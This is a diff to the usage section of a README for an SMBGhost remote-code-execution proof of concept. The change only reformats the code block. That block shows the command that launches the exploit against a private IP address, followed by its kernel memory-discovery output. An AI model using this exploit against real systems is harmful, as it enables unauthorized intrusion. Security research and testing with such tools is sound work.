@@ -8,7 +8,8 @@ Now that that's out of the way....
 
 Usage ex: 
 
-```SMBGhost_RCE_PoC % python exploit.py -ip 192.168.142.131
+``` 
+$SMBGhost_RCE_PoC python exploit.py -ip 192.168.142.131
 [+] found low stub at phys addr 13000!
 [+] PML4 at 1ad000
 [+] base of HAL heap at fffff79480000000
